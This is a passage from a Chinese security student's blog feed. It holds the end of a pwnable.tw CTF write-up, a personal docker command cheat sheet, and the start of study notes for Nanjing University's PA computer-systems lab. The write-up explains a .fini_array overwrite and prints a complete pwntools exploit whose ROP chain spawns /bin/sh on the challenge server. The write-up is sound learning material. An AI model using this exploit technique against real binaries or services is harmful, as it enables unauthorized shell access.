alt="image-20210925222320279.png"></p><p>#任意地址写</p><p>Linux程序执行过程：</p><p><code>__libc_csu_init</code> –&gt; <code>main</code> –&gt; <code>__libc_csu_fini</code></p><p>其中<code>__libc_csu_init</code>会执行<code>.init_array</code>数组中存储的函数地址，函数存储在<code>.init</code>段。<code>__libc_csu_fini</code>会执行<code>.fini_array</code>数组中存储的函数地址，函数存储在<code>.fini</code>段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 libc_csu_fini   proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: libc_csu_fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C libc_csu_fini   endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ida</span></span><br><span class="line"><span class="function">__int64 <span class="title">sub_402960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (&amp;unk_4B4100 - (_UNKNOWN *)off_4B40F0) &gt;&gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = ((&amp;unk_4B4100 - (_UNKNOWN *)off_4B40F0) &gt;&gt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      off_4B40F0[v0--]();</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_48E32C();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// glibc的源码</span></span><br><span class="line">__libc_csu_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="keyword">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题中<code>off_4B40F0</code>就是<code>.fini_array</code>，另外可以发现<code>.fini_array</code>数组中的函数是倒着调用的。</p><p>我们把<code>.fini_array[0]</code>覆盖成<code>__libc_csu_fini</code>，把<code>.fini_array[1]</code>覆盖成<code>main</code>。然后就可以无限写入地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]   ; 调用fini_array的函数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈中的地址</span><br><span class="line">0x4b40f0  fini_array[1]</span><br><span class="line">0x4b40f8    fini_array[0]</span><br><span class="line">所以我们把ROP写入0x4b4100</span><br><span class="line">shellcode随便找个可写的地址就行</span><br></pre></td></tr></table></figure><p>最后的退出函数地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line">main=<span class="number">0x401B6D</span></span><br><span class="line">fini_array=<span class="number">0x4B40F0</span></span><br><span class="line">libc_csu_fini=<span class="number">0x402960</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x446e35</span></span><br><span class="line">pop_rax_ret=<span class="number">0x41e4af</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x406c30</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401696</span></span><br><span class="line">syscall=<span class="number">0x4022b4</span></span><br><span class="line">binsh=<span class="number">0x4B9310</span></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line">leave_ret=<span class="number">0x401C4B</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main))</span><br><span class="line">write(binsh,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(esp,p64(pop_rax_ret))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi_ret))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(binsh))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rdx_ret))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rsi_ret))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[工具使用] docker</title>
      <link href="/2021/07/04/docker/"/>
      <url>/2021/07/04/docker/</url>
      
        <content type="html"><![CDATA[<p>自用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull ubuntu20.04 --platform linux/amd64</span><br><span class="line">// 载入镜像</span><br><span class="line"></span><br><span class="line">$ docker run -i -t -d -name 一个名字 ubuntu /bin/bash</span><br><span class="line">// 后台启动镜像</span><br><span class="line">// -i: 交互式操作</span><br><span class="line">// -t: 终端</span><br><span class="line">// -d: 后台启动</span><br><span class="line">// -name: 给镜像起个名</span><br><span class="line"></span><br><span class="line">$ docker ps -a</span><br><span class="line">// 查看所有的容器</span><br><span class="line"></span><br><span class="line">$ docker start 243c32535da7</span><br><span class="line">// 启动一个停止的容器</span><br><span class="line">// 可以换成stop或者restart</span><br><span class="line"></span><br><span class="line">$ docker <span class="built_in">exec</span> -it 243c32535da7 /bin/bash</span><br><span class="line">// 进入容器</span><br><span class="line"></span><br><span class="line">$ docker rm -f 1e560fca3906</span><br><span class="line">// 删除容器</span><br><span class="line"></span><br><span class="line">$ docker commit -m <span class="string">&quot;pwn18.04&quot;</span> &lt;容器id&gt; kazamayc/pwn:ubuntu-18.04</span><br><span class="line">// 打包提交docker</span><br><span class="line">// -m提交信息</span><br><span class="line">// 最后的是镜像名字和tag</span><br><span class="line"></span><br><span class="line">$ docker run -i -t kazamayc/pwn:ubuntu-18.04 /bin/bash</span><br><span class="line"></span><br><span class="line">$ docker cp /root/xxx 96f7f14e99ab:/root/</span><br><span class="line">$ docker cp 96f7f14e99ab:/root/xxx /root/</span><br><span class="line"></span><br><span class="line">$ docker —security-opt seccomp=unconfined</span><br><span class="line"></span><br><span class="line">$ --cap-add list                   Add Linux capabilities <span class="comment"># 添加某些权限</span></span><br><span class="line">$ --cap-drop list                  Drop Linux capabilities <span class="comment"># 关闭权限</span></span><br><span class="line">$ --privileged                     Give extended privileges to this container <span class="comment"># default false</span></span><br></pre></td></tr></table></figure><p>Secure computing mode (seccomp)：Linux kernel的一个特性。在Docker中利用这个特性限制container中可以做哪些操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认的seccomp profile禁用了300+个系统调用中的44个。推荐使用默认的profile，如果启动container时通过命令行参数(--security-opt seccomp=/path/to/seccomp/profile.json)，可以用自己的profile覆盖系统默认的。使用--security-opt seccomp=unconfined默认的可禁用seccomp profile。</span><br></pre></td></tr></table></figure><p>肥猫嘤嘤限定版docker，可以用这个命令解锁m1的gdb。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it ubuntu:20.04 /bin/bash</span><br></pre></td></tr></table></figure><p>因为m1 docker默认不开启SYS_PTRACE，导致gdb无法使用</p>]]></content>
      
      
      <categories>
          
          <category> 2021年7月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] 南京大学PA学习</title>
      <link href="/2021/06/10/%C2%96%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6PA%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/10/%C2%96%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6PA%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="PA0-世界诞生的前夜"><a href="#PA0-世界诞生的前夜" class="headerlink" title="PA0-世界诞生的前夜"></a>PA0-世界诞生的前夜</h1><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/">https://nju-projectn.github.io/ics-pa-gitbook/ics2019/</a></p><p>本文仅仅是对笔者自己知识遗漏的一个补充，可以辅助本文学习PA，但请不要只看本文。</p><p>有些代码参考了别的师傅，若文中有些代码运行失败，请优先查看github上的源码，然后麻烦联系我修改文章以免误导别人。万分感谢。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>我安装了一个debian10，这个怎么装就不说了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.tuna.tsinghua.edu.cn/debian/ stable main&quot;</span> &gt; /etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install build-essential</span><br><span class="line">apt-get install man</span><br><span class="line">apt-get install net-tools</span><br><span class="line">apt-get install vim </span><br><span class="line">apt-get install gdb</span><br><span class="line">apt-get install git</span><br><span class="line">apt-get install libreadline-dev</span><br><span class="line">apt-get install libsdl2-dev</span><br><span class="line">apt-get install libc6-dev-i386</span><br><span class="line">apt-get install qemu-system</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> -b 2019 https://github.com/NJU-ProjectN/ics-pa.git ics2019</span><br><span class="line">git config --global user.name <span class="string">&quot;kazamayc&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;kazamayc@gmail.com&quot;</span></span><br><span class="line">git config --global core.editor vim</span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">bash init.sh</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">make                     <span class="comment">#在nemu文件夹下</span></span><br></pre></td></tr></table></figure><h2 id="tmux使用"><a href="#tmux使用" class="headerlink" title="tmux使用"></a>tmux使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">tmux                     创建新会话</span><br><span class="line">exit和ctrl+d             关闭会话</span><br><span class="line">ctrl+b d                 退出当前会话，但是不关闭，仍在后台运行</span><br><span class="line">ctrl+b s                 列出所有会话，这里的切换上下可以用vim语法(太贴心了)</span><br><span class="line">ctrl+b $                 重命名当前会话</span><br><span class="line">ctrl+b %                 划分左右两个会话</span><br><span class="line">ctrl+b &quot;                 划分上下两个会话</span><br><span class="line">ctrl+b ;                 切换到上一个会话</span><br><span class="line">ctrl+b o                 切换到下一个会话</span><br><span class="line">ctrl+b &#123;                 当前会话与上一个会话交换位置</span><br><span class="line">ctrl+b &#125;                 当前会话和下一个会话交换位置</span><br><span class="line">ctrl+b ctrl+o            所有会话向后移动一个位置，最后一个会话变成第一个会话</span><br><span class="line">ctrl+b !                 把当前会话拆分成一个</span><br><span class="line">ctrl+b z                 把当前会话全屏显示，再用一次会恢复大小</span><br><span class="line">ctrl+b q                 显示会话编号</span><br><span class="line">ctrl+b c                 创建一个新会话</span><br><span class="line">ctrl+b p                 切换到上一个会话</span><br><span class="line">ctrl+b n                 切换到下一个会话</span><br><span class="line">ctrl+b &lt;num&gt;             切换到指定编号的窗口</span><br><span class="line">ctrl+b w                 从列表中选择会话</span><br><span class="line">ctrl+b ,                 会话重命名</span><br></pre></td></tr></table></figure><h1 id="PA1-开天辟地的篇章"><a href="#PA1-开天辟地的篇章" class="headerlink" title="PA1-开天辟地的篇章"></a>PA1-开天辟地的篇章</h1><blockquote><p>task PA1.1: 实现单步执行, 打印寄存器状态, 扫描内存</p><p>task PA1.2: 实现算术表达式求值</p><p>task PA1.3: 实现所有要求, 提交完整的实验报告</p></blockquote><h2 id="1-如何玩超级马里奥"><a href="#1-如何玩超级马里奥" class="headerlink" title="1.)如何玩超级马里奥"></a>1.)如何玩超级马里奥</h2><ul><li>在<code>nexus-am/apps/litenes/</code>目录下执行<code>make rom</code>生成ROM<code>文件</code>，然后执行<code>make run mainargs=mario</code>就可以运行。</li><li>其他游戏查看<code>nexus-am/apps/litenes/src/roms/rom</code>的内容，然后对mainargs进行修改即可。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">操作方式:</span><br><span class="line"></span><br><span class="line">* T — SELECT</span><br><span class="line">* Y — START</span><br><span class="line">* G — A键</span><br><span class="line">* H — B键</span><br><span class="line">* W/S/A/D — UP/DOWN/LEFT/RIGHT</span><br></pre></td></tr></table></figure><h2 id="2-一台简单的计算机"><a href="#2-一台简单的计算机" class="headerlink" title="2.)一台简单的计算机"></a>2.)一台简单的计算机</h2><p>计算机运行的程序是由代码和数据组成的，而计算机是怎么运行程序的呢？</p><p>结构上， 一台简单的计算机要有存储程序的<strong>存储器</strong>，有用于暂存数据加快运算的<strong>寄存器</strong>，有用于计算的<strong>运算器</strong>，有永远指向当前执行指令的<strong>程序计数器PC</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  从PC指示的存储器位置取出指令;</span><br><span class="line">  执行指令;</span><br><span class="line">  更新PC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-框架代码初探"><a href="#3-框架代码初探" class="headerlink" title="3.)框架代码初探"></a>3.)框架代码初探</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ics2019</span><br><span class="line">├── init.sh       # 初始化脚本</span><br><span class="line">├── Makefile      # 用于工程打包提交</span><br><span class="line">├── nanos-lite    # 微型操作系统内核</span><br><span class="line">├── navy-apps     # 应用程序集</span><br><span class="line">├── nemu          # NEMU</span><br><span class="line">├── nexus-am      # 抽象计算机</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><p>目前我们只需要学习NEMU，NEMU主要由四个部分构成：monitor，CPU，memory，设备。它的功能是负责模拟出一套计算机硬件，让程序可以在其上运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">nemu</span><br><span class="line">├── include                    # 存放全局使用的头文件</span><br><span class="line">│   ├── common.h               # 公用的头文件</span><br><span class="line">│   ├── cpu</span><br><span class="line">│   │   ├── decode.h           # 译码相关</span><br><span class="line">│   │   └── exec.h             # 执行相关</span><br><span class="line">│   ├── debug.h                # 一些方便调试用的宏</span><br><span class="line">│   ├── device                 # 设备相关</span><br><span class="line">│   ├── macro.h                # 一些方便的宏定义</span><br><span class="line">│   ├── memory                 # 访问内存相关</span><br><span class="line">│   ├── monitor</span><br><span class="line">│   │   ├── expr.h             # 表达式求值相关</span><br><span class="line">│   │   ├── log.h              # 日志文件相关</span><br><span class="line">│   │   ├── monitor.h</span><br><span class="line">│   │   └── watchpoint.h       # 监视点相关</span><br><span class="line">│   ├── nemu.h</span><br><span class="line">│   └── rtl</span><br><span class="line">│       ├── rtl.h              # RTL基本指令</span><br><span class="line">│       └── rtl-wrapper.h</span><br><span class="line">├── Makefile                   # 指示NEMU的编译和链接</span><br><span class="line">├── Makefile.git               # git版本控制相关</span><br><span class="line">├── runall.sh                  # 一键测试脚本</span><br><span class="line">└── src                        # 源文件</span><br><span class="line">    ├── cpu</span><br><span class="line">    │   └── cpu.c              # 执行一条指令</span><br><span class="line">    ├── device                 # 设备相关</span><br><span class="line">    ├── isa                    # ISA相关的实现</span><br><span class="line">    │   ├── mips32</span><br><span class="line">    │   ├── riscv32</span><br><span class="line">    │   └── x86</span><br><span class="line">    ├── main.c                 # 你知道的...</span><br><span class="line">    ├── memory</span><br><span class="line">    │   └── memory.c           # 访问内存的接口函数</span><br><span class="line">    └── monitor</span><br><span class="line">        ├── cpu-exec.c         # 指令执行的主循环</span><br><span class="line">        ├── debug              # 简易调试器相关</span><br><span class="line">        │   ├── expr.c         # 表达式求值的实现</span><br><span class="line">        │   ├── log.c          # 日志文件相关</span><br><span class="line">        │   ├── ui.c           # 用户界面相关</span><br><span class="line">        │   └── watchpoint.c   # 监视点的实现</span><br><span class="line">        ├── diff-test</span><br><span class="line">        └── monitor.c</span><br></pre></td></tr></table></figure><h2 id="4-阅读NEMU代码"><a href="#4-阅读NEMU代码" class="headerlink" title="4.)阅读NEMU代码"></a>4.)阅读NEMU代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_monitor</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span> *[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ui_mainloop</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Initialize the monitor. */</span></span><br><span class="line">  <span class="keyword">int</span> is_batch_mode = init_monitor(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receive commands from user. */</span></span><br><span class="line">  ui_mainloop(is_batch_mode);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Monitor模块是为了方便地监控客户计算机的运行状态而引入的，它除了负责与GNU/Linux进行交互(例如读入客户程序)之外，还带有调试器的功能，为NEMU的调试提供了方便的途径。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_monitor</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 进行一些全局初始化 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 解析参数 */</span></span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 打开日志文件 */</span></span><br><span class="line">  init_log(log_file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将镜像加载到内存 */</span></span><br><span class="line">  <span class="keyword">long</span> img_size = load_img();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 执行依赖于ISA的初始化 */</span></span><br><span class="line">  init_isa();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 编译正则表达式 */</span></span><br><span class="line">  init_regex();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化watchpoint pool */</span></span><br><span class="line">  init_wp_pool();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设备 */</span></span><br><span class="line">  init_device();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化差分测试 */</span></span><br><span class="line">  init_difftest(diff_so_file, img_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Display welcome message. */</span></span><br><span class="line">  welcome();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> is_batch_mode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="parse-args"><a href="#parse-args" class="headerlink" title="parse_args"></a>parse_args</h3><p>我们挨个解析函数，首先是解析参数。这里还用于读入镜像。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 